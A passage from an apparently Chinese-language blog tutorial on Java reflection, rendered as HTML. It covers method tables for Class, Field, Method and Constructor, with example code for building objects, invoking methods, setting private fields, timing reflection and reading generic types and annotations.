clazz)</td><td>把传递的类的对象转换成代表其子类的对象</td></tr><tr><td>Cast</td><td>把对象转换成代表类或是接口的对象</td></tr><tr><td>getClassLoader()</td><td>获得类的加载器</td></tr><tr><td>getClasses()</td><td>返回一个数组，数组中包含该类中所有公共类和接口类的对象</td></tr><tr><td>getDeclaredClasses()</td><td>返回一个数组，数组中包含该类中所有类和接口类的对象</td></tr><tr><td>forName(String className)</td><td>根据类名返回类的对象</td></tr><tr><td>getName()</td><td>获得类的完整路径名字</td></tr><tr><td>newInstance()</td><td>创建类的实例</td></tr><tr><td>getPackage()</td><td>获得类的包</td></tr><tr><td>getSimpleName()</td><td>获得类的名字</td></tr><tr><td>getSuperclass()</td><td>获得当前类继承的父类的名字</td></tr><tr><td>getInterfaces()</td><td>获得当前类实现的类或是接口</td></tr></tbody></table><p>获得类中属性相关的方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getField(String name)</td><td>获得某个公有的属性对象</td></tr><tr><td>getFields()</td><td>获得所有公有的属性对象</td></tr><tr><td>getDeclaredField(String name)</td><td>获得某个属性对象</td></tr><tr><td>getDeclaredFields()</td><td>获得所有属性对象</td></tr></tbody></table><p>获得类中注解相关的方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getAnnotation(Class<A> annotationClass)</td><td>返回该类中与参数类型匹配的公有注解对象</td></tr><tr><td>getAnnotations()</td><td>返回该类所有的公有注解对象</td></tr><tr><td>getDeclaredAnnotation(Class<A> annotationClass)</td><td>返回该类中与参数类型匹配的所有注解对象</td></tr><tr><td>getDeclaredAnnotations()</td><td>返回该类所有的注解对象</td></tr></tbody></table><p>获得类中构造器相关的方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getConstructor(Class…&lt;?&gt; parameterTypes)</td><td>获得该类中与参数类型匹配的公有构造方法</td></tr><tr><td>getConstructors()</td><td>获得该类的所有公有构造方法</td></tr><tr><td>getDeclaredConstructor(Class…&lt;?&gt; parameterTypes)</td><td>获得该类中与参数类型匹配的构造方法</td></tr><tr><td>getDeclaredConstructors()</td><td>获得该类所有构造方法</td></tr></tbody></table><p>获得类中方法相关的方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getMethod(String name, Class…&lt;?&gt; parameterTypes)</td><td>获得该类某个公有的方法</td></tr><tr><td>getMethods()</td><td>获得该类所有公有的方法</td></tr><tr><td>getDeclaredMethod(String name, Class…&lt;?&gt; parameterTypes)</td><td>获得该类某个方法</td></tr><tr><td>getDeclaredMethods()</td><td>获得该类所有方法</td></tr></tbody></table><p>类中其他重要的方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>isAnnotation()</td><td>如果是注解类型则返回true</td></tr><tr><td>isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)</td><td>如果是指定类型注解类型则返回true</td></tr><tr><td>isAnonymousClass()</td><td>如果是匿名类则返回true</td></tr><tr><td>isArray()</td><td>如果是一个数组类则返回true</td></tr><tr><td>isEnum()</td><td>如果是枚举类则返回true</td></tr><tr><td>isInstance(Object obj)</td><td>如果obj是该类的实例则返回true</td></tr><tr><td>isInterface()</td><td>如果是接口类则返回true</td></tr><tr><td>isLocalClass()</td><td>如果是局部类则返回true</td></tr><tr><td>isMemberClass()</td><td>如果是内部类则返回true</td></tr></tbody></table><h1 id="Field类"><a href="#Field类" class="headerlink" title="Field类"></a>Field类</h1><p>代表类的成员变量（成员变量也称为类的属性)</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>equals(Object obj)</td><td>属性与obj相等则返回true</td></tr><tr><td>get(Object obj)</td><td>获得obj中对应的属性值</td></tr><tr><td>set(Object obj, Object value)</td><td>设置obj中对应属性值</td></tr></tbody></table><h1 id="Method类"><a href="#Method类" class="headerlink" title="Method类"></a>Method类</h1><p>代表类的方法。</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>invoke(Object obj, Object… args)</td><td>传递object对象及参数调用该对象对应的方法</td></tr></tbody></table><h1 id="Constructor类"><a href="#Constructor类" class="headerlink" title="Constructor类"></a>Constructor类</h1><p>代表类的构造方法</p><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>newInstance(Object… initargs)</td><td>根据传递的参数创建类的对象</td></tr></tbody></table><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c1 = Preson,<span class="class"><span class="keyword">class</span></span>;</span><br></pre></td></tr></table></figure><p>若已知某个类的实例，调用该实例的getClass()方法获取Clas对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c2 = person.getClass();</span><br></pre></td></tr></table></figure><p>若已知一个类的全类名，并且类在类路径下，可通过Class类的静态方法forName()获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c3 = Class.forName(<span class="string">&quot;dome.Student&quot;</span>);</span><br></pre></td></tr></table></figure><p>内置基本数据类型可以直接用类名.Type</p><p>以下类型可以有Class对象</p><ol><li>class 外部类、成员(成员内部类，静态内部类), 局部内部类, 匿名内部类</li><li>interface 接口</li><li>[] 数组</li><li>enum 枚举</li><li>annotation 注解</li><li>primitive type 基本数据类型</li><li>void </li></ol><h2 id="获取类完整结构"><a href="#获取类完整结构" class="headerlink" title="获取类完整结构"></a>获取类完整结构</h2><p>获取所有的接口、</p><ul><li>所继承的父类、</li><li>全部构造器、</li><li>全部的方法、</li><li>全部的Field、</li><li>注解……</li></ul><p>查看类的名字<code>getName()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Class aClass1 = user.getClass();</span><br><span class="line">       System.out.println(aClass1.getName()); <span class="comment">//获取名字 + 包名路径</span></span><br><span class="line">       System.out.println(aClass1.getSimpleName()); <span class="comment">// 获取类名</span></span><br></pre></td></tr></table></figure><p>查看类的字段<code>getFields()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = aClass1.getFields(); <span class="comment">// 只能获取公有的</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field[] declaredFields = aClass1.getDeclaredFields(); <span class="comment">// 所有都能获取</span></span><br><span class="line">        <span class="keyword">for</span> (Field declaredField : declaredFields) &#123;</span><br><span class="line">            System.out.println(declaredField);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>获得方法<code>getMethods()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获得公共方法</span></span><br><span class="line">Method[] methods = aClass1.getMethods();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    System.out.println(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取所有方法</span></span><br><span class="line">Method[] declaredMethods = aClass.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method declaredMethod : declaredMethods) &#123;</span><br><span class="line">    System.out.println(declaredMethod);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获得指定方法</span></span><br><span class="line">Method getName = aClass1.getMethod(<span class="string">&quot;getName&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">Method getName1 = aClass1.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">System.out.println(getName);</span><br><span class="line">System.out.println(getName1);</span><br></pre></td></tr></table></figure><p>获得构造器<code>getConstructor()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得构造器</span></span><br><span class="line">       Constructor constructor = aClass1.getConstructor();</span><br><span class="line">       System.out.println(constructor);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获得所有构造器</span></span><br><span class="line">       Constructor[] constructors = aClass1.getConstructors();</span><br><span class="line">       <span class="keyword">for</span> (Constructor constructor1 : constructors) &#123;</span><br><span class="line">           System.out.println(constructor1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获得指定构造器</span></span><br><span class="line">       Constructor constructor1 = aClass1.getConstructor(String.class, <span class="keyword">int</span>.class, String.class);</span><br><span class="line">       System.out.println(constructor1);</span><br></pre></td></tr></table></figure><h2 id="构造对象"><a href="#构造对象" class="headerlink" title="构造对象"></a>构造对象</h2><p>类必须要有一个无参构造器。</p><p>类的构造器访问权限需要足够。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用反射构造对象</span></span><br><span class="line">        Class&lt;User&gt; userClass = User.class;</span><br><span class="line">        User user1 = userClass.newInstance();</span><br><span class="line">        System.out.println(user1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射构造器创建对象</span></span><br><span class="line">        Constructor&lt;User&gt; constructor2 = userClass.getConstructor(String.class, <span class="keyword">int</span>.class, String.class);</span><br><span class="line">        User user2 = constructor2.newInstance(<span class="string">&quot;张三&quot;</span>, <span class="number">18</span>, <span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        System.out.println(user2);</span><br></pre></td></tr></table></figure><h2 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// invoke(对象, 方法值) 激活 若参数列表为空则为null</span></span><br><span class="line">       Method setName = userClass.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">       setName.invoke(user2, <span class="string">&quot;李四&quot;</span>);</span><br><span class="line">       System.out.println(user2);</span><br></pre></td></tr></table></figure><h2 id="操作属性"><a href="#操作属性" class="headerlink" title="操作属性"></a>操作属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过反射操作属性</span></span><br><span class="line">        Class&lt;User&gt; userClass1 = User.class;</span><br><span class="line">        User user3 = userClass1.newInstance();</span><br><span class="line">        Field name = userClass1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>); <span class="comment">// 开启暴力反射 可以访问private属性和方法</span></span><br><span class="line">        name.set(user3, <span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        System.out.println(user3);</span><br></pre></td></tr></table></figure><p>使用反射对比普通方式</p><ul><li>反射效率会略慢</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestRefection</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">            user.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;普通方式使用时间:&quot;</span>+(endTime-startTime)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反射方式</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        Class&lt;User&gt; userClass = User.class;</span><br><span class="line">        User user = userClass.newInstance();</span><br><span class="line">        Method getName = userClass.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">            getName.invoke(user, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;反射方式使用时间:&quot;</span>+(endTime-startTime)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射方式关闭检测</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        Class&lt;User&gt; userClass = User.class;</span><br><span class="line">        User user = userClass.newInstance();</span><br><span class="line">        Method getName = userClass.getMethod(<span class="string">&quot;getName&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        getName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">            getName.invoke(user, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;反射方式关闭检测使用时间:&quot;</span>+(endTime-startTime)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        TestRefection testRefection = <span class="keyword">new</span> TestRefection();</span><br><span class="line">        testRefection.test1();</span><br><span class="line">        testRefection.test2();</span><br><span class="line">        testRefection.test3();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">普通方式使用时间:4ms</span><br><span class="line">反射方式使用时间:1059ms</span><br><span class="line">反射方式关闭检测使用时间:2219ms</span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="获得泛型信息"><a href="#获得泛型信息" class="headerlink" title="获得泛型信息"></a>获得泛型信息</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">(Map&lt;String, User&gt; map, List&lt;User&gt; list)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, User&gt; <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;Refection.Test2&quot;</span>);</span><br><span class="line">        Method method = aClass.getMethod(<span class="string">&quot;test1&quot;</span>, Map.class, List.class);</span><br><span class="line">        Type[] genericParameterTypes = method.getGenericParameterTypes(); <span class="comment">// 获取参数类型</span></span><br><span class="line">        <span class="keyword">for</span> (Type genericParameterType : genericParameterTypes) &#123;</span><br><span class="line">            System.out.println(genericParameterType);</span><br><span class="line">            <span class="keyword">if</span>(genericParameterType <span class="keyword">instanceof</span> ParameterizedType)&#123;</span><br><span class="line">                Type[] actualTypeArguments = ((ParameterizedType) genericParameterType).getActualTypeArguments();</span><br><span class="line">                <span class="keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;</span><br><span class="line">                    System.out.println(actualTypeArgument);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Method test2 = aClass.getMethod(<span class="string">&quot;test2&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        Type genericReturnType = test2.getGenericReturnType(); <span class="comment">// 获取返回值类型</span></span><br><span class="line">        <span class="keyword">if</span>(genericReturnType <span class="keyword">instanceof</span> ParameterizedType)&#123;</span><br><span class="line">            Type[] actualTypeArguments = ((ParameterizedType) genericReturnType).getActualTypeArguments();</span><br><span class="line">            <span class="keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;</span><br><span class="line">                System.out.println(actualTypeArgument);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.util.Map&lt;java.lang.String, Refection.User&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Refection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class"><span class="title">java</span>.<span class="title">util</span>.<span class="title">List</span>&lt;<span class="title">Refection</span>.<span class="title">User</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Refection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class"></span>================</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Refection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">Process</span> <span class="title">finished</span> <span class="title">with</span> <span class="title">exit</span> <span class="title">code</span> 0</span></span><br></pre></td></tr></table></figure><h2 id="获得注解"><a href="#获得注解" class="headerlink" title="获得注解"></a>获得注解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;Refection.Student&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取取注解</span></span><br><span class="line">        Annotation[] annotations = aClass.getAnnotations();</span><br><span class="line">        <span class="keyword">for</span> (Annotation annotation : annotations) &#123;</span><br><span class="line">            System.out.println(annotation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得指定注解</span></span><br><span class="line">        MyAnnotationClass annotation = aClass.getAnnotation(MyAnnotationClass.class);</span><br><span class="line">        System.out.println(annotation.value());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得字段上的注解</span></span><br><span class="line">        Field id = aClass.getDeclaredField(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        MyAnnotationFiled annotation1 = id.getAnnotation(MyAnnotationFiled.class);</span><br><span class="line">        System.out.println(annotation1.columnName());</span><br><span class="line">        System.out.println(annotation1.type());</span><br><span class="line">        System.out.println(annotation1.length());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MyAnnotationClass(value = &quot;user_db&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MyAnnotationFiled(columnName = &quot;db_id&quot;, type = &quot;int&quot;, length = 10)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MyAnnotationFiled(columnName = &quot;db_age&quot;, type = &quot;int&quot;, length = 10)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MyAnnotationFiled(columnName = &quot;db_name&quot;, type = &quot;varchar&quot;, length = 10)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">int</span> age, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span 